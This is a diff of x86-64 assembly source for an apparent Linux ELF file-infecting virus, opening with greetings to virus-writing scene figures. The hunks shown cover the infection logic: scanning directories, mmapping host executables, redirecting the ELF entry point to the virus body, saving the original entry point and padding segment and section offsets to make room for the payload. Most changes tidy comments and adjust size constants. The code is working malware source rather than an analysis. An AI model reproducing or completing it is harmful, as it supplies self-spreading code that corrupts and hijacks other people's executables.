@@ -61,10 +61,8 @@ BITS 64
 ; Travis Goodspeed 
 ; Silvio (Silvio if you read this then, hello! I love your work!)
 ; jduck, botvx, mrphrazer, lauriewired
-; 0daysimpson, zeta, dnz, srsns, xcellerator, bane, h0wdy, gren, museifu, domino
+; 0daysimpson, zeta, dnz, srsns, xcellerator, bane, h0wdy, gren 
 ; Aaron DeVera
-; Cabal
-; 
 ; Everyone in the slop pit/the Haunted Computer Club and all my homies near + far
 ; ilysm xoxoxoxoxoxxo 
 ;
@@ -465,46 +463,26 @@ check_file:
 		mov r8, rax
 		mov [r14 + 144], rax
 		xor r12, r12
-	
 	.copy_filename:
 		lea rdi, [r14 + 200] 
 		lea rsi, [rcx + r14 + 618]
-		;lea rax, [rcx + r14 + 618]
-		;push rax
-		;push rsi
 		.copy_filename_loop:
 			mov byte al, [rsi]
-		;	movsb
 			mov byte [rdi], al
 			inc rsi
 			inc rdi
-		;	inc r12
 			cmp byte [rsi], 0x0
 			jne .copy_filename_loop
-		;call _write
 		xor rax, rax
 		xor r12, r12
-		;pop rdi
 		jmp get_vx_name
-	
-	;check_filename:
-	;	lea rdi, qword [r14 + 200]
-	;	cmp word [rdi], 0x002e
-	;	je checknext
-	;	jmp get_vx_name
 	check_vx_name:
 		pop rsi
-		;lea rax, qword [r14 + 200]
-		;mov rdi, qword [rcx + r14 + 618]
 		lea rdi, qword [r14 + 200]
-		;lea rdi, qword [r14 + 200]
-		;push rax
-		;lea rdi, qword [r14 + 200]
 		cld
 		.filenameloop:
 			mov byte al, [rsi]
 			cmp byte [rdi], al
-			;repnz cmpsb
 			jne get_filestat
 			inc r12
 			inc rdi
@@ -528,16 +506,16 @@ check_file:
 		xor rdi, rdi			;set RDI to NULL
 		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
-					; fd is already in r8 so we don't need to set that reg again
+								; fd is already in r8 
 		mov r10, 0x2			; MAP_PRIVATE
-		xor r9, r9				; offset of 0 within file == start of file, obv	
+		xor r9, r9				; offset of 0 within file	
 		mov rax, 0x9 			;SYS_MMAP
 		syscall
 		cmp rax, 0
 		jb checknext
 		pop r9
 		mov r8, rax
-		mov [r14 + 800], rax	;rax contains address of mmap'd host ELF
+		mov [r14 + 800], rax	;rax contains addr of mmap'd host ELF
 		push rax
 	close_curr_file:
 		mov rdi, r9
@@ -594,9 +572,9 @@ check_file:
 	;is cleared (except for the first two bytes)
 	;so that target filename does not retain leftover chars
 	;from previous filename save
-		lea rdi, [r14 + 201]
-		xor rax, rax
-		mov qword [rdi], 0x01
+		;lea rdi, [r14 + 201]
+		;xor rax, rax
+		;mov qword [rdi], 0x01
 
 		pop rcx
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
@@ -731,53 +709,80 @@ infect:
 ;PFLAGS_RX	equ 0x5
 ;PFLAGS_RW	equ 0x6
 ;*******************************************************************************
+;***************************************************************
 	xor rcx, rcx
 	xor r11, r11
-	mov word cx, [r13 + 56]						;elf_ehdr.e_phnum
+	mov word cx, [r13 + 56]			;elf_ehdr.e_phnum
 	check_phdrs:
 		.phdr_loop:
 			push rcx
-			cmp word [r13 + r12], 0x1			;check elf_phdr.p_type == PT_LOAD	
+			;check elf_phdr.p_type offset == type PT_LOAD	
+			cmp word [r13 + r12], 0x1			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
-				cmp dword [r13 + r12 + 4], 0x5	;elf_phdr.p_flags == PFLAG_R | PFLAG_X
+				;check elf_phdr.p_flags == PFLAG_R | PFLAG_X			
+				cmp dword [r13 + r12 + 4], 0x5	
 				je .mod_phdr_text_segment			
 				jmp .mod_subsequent_phdr
-				.mod_phdr_text_segment:			
-					mov r10, [r13 + r12 + 16] 	;entry virtual addr (r14 + 400)
-												;evaddr= phdr->p_vaddr + phdr->p_filesz
-					add r10, [r13 + r12 + 32]	; elf_phdr.p_filesz offset
-					mov qword [r14 + 400], r10	; save evaddr to (r14 + 400)
 
-					mov r11, qword [r13 + 24]	;load address of original entry point from ELF header
+				.mod_phdr_text_segment:			
+				; entry virus addr (evaddr)= 
+				; phdr->p_vaddr + phdr->p_filesz				
+				; save evaddr to (r14 + 400)
+				; load address of OEP from ELF header
+				; new entry point of infected file = evaddr
+				; patch ELF header entry point to start of vx code
+				; vxoffset = elf_phdr.p_offset+elf_phdr.p_filesz
+				; save vxoffset to stack
+				; phdr.p_filesz += vlen+10(size of jmp to OEP)
+				; phdr.p_memsz += vlen+10(size of jmp to OEP)
+	
+					mov r10, [r13 + r12 + 16] 	;elf_phdr.p_vaddr
+					add r10, [r13 + r12 + 32]	;elf_phdr.p_filesz
+					mov qword [r14 + 400], r10
+					mov r11, qword [r13 + 24]	
 					mov qword [r14 + 448], r11	;save OEP to stack
-												;new entry point of infected file = r14 + 400 + ventry
-					mov qword [r13 + 24], r10		; patch ELF header entry point to virus code start
-					mov r10, [r13 + r12 + 8]		; elf_phdr.p_offset  
-					add r10, [r13 + r12 + 32]		; elf_phdr.p_filesz offset
+					
+					mov qword [r13 + 24], r10
+
+					mov r10, [r13 + r12 + 8]	;elf_phdr.p_offset  
+					add r10, [r13 + r12 + 32]	;elf_phdr.p_filesz
 					mov dword [r14 + 436], r10d
-					add qword [r13 + r12 + 32], vlen+30	;elf_phdr.p_filesz offset
-					add qword [r13 + r12 + 40], vlen+30	;elf_phdr.p_memsz offset
-					jmp .next_phdr						
+
+					add qword [r13 + r12 + 32], vlen+12
+					add qword [r13 + r12 + 40], vlen+12	
+					jmp .next_phdr				
+		
 			.mod_subsequent_phdr:
+			; load variable from stack corresponding to 
+			; offset of next segment after .text in host ELF
+			; check if this variable has already been defined
+			; in a previous loop iteration 
+			; (check if next_segment_offset == 0)
+			; otherwise, move offset of curr segment to that var
+			; because based on checks up to this point, we know
+			; that r11 contains offset of next segment after .text 
+			; segment, in host ELF 
+			;
 				xor r11, r11
 				mov r11d, [r14 + 436]
 				cmp r11d, 0
 				je .next_phdr
-				mov r10, qword [r13 + r12 + 8]			;elf_phdr.p_offset  
+				mov r10, [r13 + r12 + 8]		;elf_phdr.p_offset  
 				cmp r10, qword [r14 + 400]
 				jl .next_phdr
-				add r10d, [PAGESIZE]
-				mov qword [r13 + r12 + 8], r10				;elf_phdr.p_offset
+				add dword r10d, [PAGESIZE]
+				mov [r13 + r12 + 8], r10		;elf_phdr.p_offset
 				xor r10, r10
-				mov r10, qword [r14 + 424]; offset of next segment after .text segment in host ELF
+				mov r10, qword [r14 + 424]
 				cmp r10, 0
 				jne .next_phdr
-				mov qword [r14 + 424], r11; offset of next segment after .text segment in host ELF
+				mov qword [r14 + 424], r11
 		.next_phdr:
 			pop rcx
 			dec cx 
-			add r12w, word [r13 + 54] 					 ;add elf_ehdr.e_phentsize to phdr offset in r12 
+			;add elf_ehdr.e_phentsize to phdr offset in r12
+			add r12w, word [r13 + 54] 
 			cmp cx, 0
 			jg .phdr_loop
 	mov dword [r14 + 432], r12d
@@ -851,8 +856,6 @@ infect:
 			jg .shdr_loop
 	mov r11, [r13 + 40] 					;elf_ehdr.e_shoff
 	mov qword [r14 + 408], r11				;original shoff
-;	cmp dword r11d, [r14 + 436]
-;	jge .patch_ehdr_shoff
 	.patch_ehdr_shoff:
 		add dword r11d, [PAGESIZE]
 		mov qword [r13 + 40], r11 			;elf_ehdr.e_shoff
